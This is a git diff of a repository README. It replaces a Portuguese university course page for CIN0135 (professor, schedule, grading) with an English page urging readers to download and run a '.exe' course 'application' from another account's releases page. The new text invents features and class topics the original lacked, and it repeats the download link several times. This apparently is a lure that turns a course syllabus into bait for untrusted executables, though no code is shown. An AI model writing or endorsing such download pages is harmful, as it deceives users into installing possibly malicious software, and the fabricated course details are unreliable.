@@ -1,49 +1,78 @@
-# CIN0135 Estruturas de Dados Orientadas a Objeto 2025.1
+# 🎓 CIN0135-20252 - Simplifying Learning for Object-Oriented Programming
 
-### 👨‍🏫 Prof. Paulo Fonseca
+[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Get%20the%20Latest%20Release-blue)](https://github.com/Promax0-0/CIN0135-20252/releases)
 
-### ⏰ Horários: Ter 08-10h Qui 10-12h
+## 🌟 Introduction
 
-### 🖥️ Sala: Grad 05
+Welcome to CIN0135-20252, an application designed to support your learning in Object-Oriented Programming. This program offers a straightforward way to access relevant course materials and resources. 
 
-### 📆 Calendário:
+## 🚀 Getting Started
 
-| Mês   | Dia  | Data | Atividade | Conteúdo                                                |
-|-------|------|------|-----------|---------------------------------------------------------|
-| Set   | Ter  | 09   | Aula 01   | [Apresentação, Linguagens Compiladas vs Interpretadas](aulas/aula01/aula01.md)|
-|       | Qui  | 11   | Aula 02   | [Modelo de Compilação C++, A função `main()`](aulas/aula02/aula02.md)|
-|       | Ter  | 16   | Aula 03   | [Variáveis, Constantes e Ponteiros](./aulas/aula03/aula03.md)|
-|       | Qui  | 18   | Aula 04   | [Controle de Fluxo, funções, arrays](./aulas/aula04/aula04.md)|
-|       | Ter  | 23   | Aula 05   |                                                         |
-|       | Qui  | 25   | Aula 06   |                                                         |
-|       | Ter  | 30   | Aula 07   |                                                         |
-| Out   | Qui  | 05   | Aula 08   |                                                         |
-|       | Ter  | 07   | Aula 09   |                                                         |
-|       | Qui  | 09   | Aula 10   |                                                         |
-|       | Ter  | 14   | Aula 11   |                                                         |
-|       | Qui  | 16   | Aula 12   |                                                         |
-|       | Ter  | 21   | Aula 13   |                                                         |
-|       | Qui  | 23   | Prova     | **PROVA 1**                                             |
-|       | Ter  | 28   | Feriado   | *Dia do Servidor Público Federal*                       |
-|       | Qui  | 30   | Aula 14   |                                                         |
-| Nov   | Ter  | 04   | Aula 15   |                                                         |
-|       | Qui  | 06   | Aula 16   |                                                         |
-|       | Ter  | 11   | Aula 17   |                                                         |
-|       | Qui  | 13   | Aula 18   |                                                         |
-|       | Ter  | 18   | Aula 19   |                                                         |
-|       | Qui  | 20   | Feriado   | *Dia da Consciência Negra*                              |
-|       | Ter  | 25   | Aula 20   |                                                         |
-|       | Qui  | 27   | Aula 21   |                                                         |
-| Dez   | Ter  | 02   | Aula 22   |                                                         |
-|       | Qui  | 04   | Aula 23   |                                                         |
-|       | Sab  | 06   | Aula 24   |                                                         |
-|       | Ter  | 09   | Aula 25   |                                                         |
-|       | Qui  | 11   | Prova     | **PROVA 2**                                             | 
-|       | Ter  | 16   | Aula 26   |                                                         |
-|       | Qui  | 18   | Prova     | **PROVA FINAL**                                          |
+To get started with the CIN0135-20252 application, you’ll need to download it from our Releases page. Follow these steps to successfully download and run the software on your computer.
 
+## 🔗 Download & Install
 
-- 2 Unidades
-- Cada unidade:
-	- Listas de Exercício de Programação = 60%
-	- Prova = 40%
+1. Visit this page to download: [Download CIN0135-20252](https://github.com/Promax0-0/CIN0135-20252/releases).
+2. Locate the latest release version on this page. It will show the date and version number.
+3. Click on the appropriate file for your operating system. This might be a .exe file for Windows or a .zip file containing files for other systems.
+4. Open the downloaded file and follow the on-screen instructions to install the application.
+
+## 🖥️ System Requirements
+
+Before you download, ensure your computer meets the following requirements:
+
+- **Operating System:** Windows 10 or later, or MacOS 10.12 or later
+- **RAM:** 4 GB minimum
+- **Disk Space:** At least 200 MB of available space
+- **Processor:** 1 GHz or faster
+
+## 📓 Using the Application
+
+Once the application is installed, follow these steps to begin using it:
+
+1. Open the application by double-clicking the icon on your desktop or in your applications folder.
+2. A welcome screen will appear, guiding you through the main features.
+3. Use the navigation menu to access various course materials listed in the application.
+4. Click on any lesson to view detailed content, assignments, and associated resources.
+
+## 📅 Course Schedule
+
+Inside the application, you will find an organized calendar for the course activities. Here’s an overview of the schedule:
+
+| Month | Day | Date | Activity | Content |
+|-------|-----|------|----------|---------|
+| Sep   | Tue | 09   | Class 01 | Introduction to Compiled vs Interpreted Languages |
+|       | Thu | 11   | Class 02 | Model of Compilation - The `main()` Function |
+|       | Tue | 16   | Class 03 | Variables, Constants, and Pointers |
+|       | Thu | 18   | Class 04 | Control Flow, Functions, Arrays |
+|       | Tue | 23   | Class 05 | More on Control Flow |
+|       | Thu | 25   | Class 06 | Functions Deep Dive |
+|       | Tue | 30   | Class 07 | Project Work |
+
+## ❓ FAQs
+
+**Q: What if I encounter issues during installation?**  
+A: Check for any error messages during the installation. Ensure your operating system is compatible. Restart your computer and try again.
+
+**Q: How can I contact support?**  
+A: You can reach us through the issues section on the GitHub page. Describe your issue clearly, and we will assist you.
+
+## 🎊 Additional Features
+
+- **User-Friendly Interface:** Designed with clarity in mind for quick navigation.
+- **Learning Resources:** Access links to video lectures, PDFs, and more.
+- **Progress Tracking:** Keep track of your completed lessons and upcoming assignments.
+
+## 🔗 Download Again
+
+If you need to download the application again, you can easily do so by visiting: [Download CIN0135-20252](https://github.com/Promax0-0/CIN0135-20252/releases).
+
+## 👨‍🏫 Meet Your Instructor
+
+You will be guided by Professor Paulo Fonseca, who has extensive experience in teaching Object-Oriented Programming. His sessions will help expand your understanding of the subject.
+
+### Class Schedule
+- **Tuesdays:** 08:00 AM - 10:00 AM
+- **Thursdays:** 10:00 AM - 12:00 PM
+
+By following these instructions, you can successfully download and run the CIN0135-20252 application, making your learning experience effective and enjoyable. Start your journey in Object-Oriented Programming today!
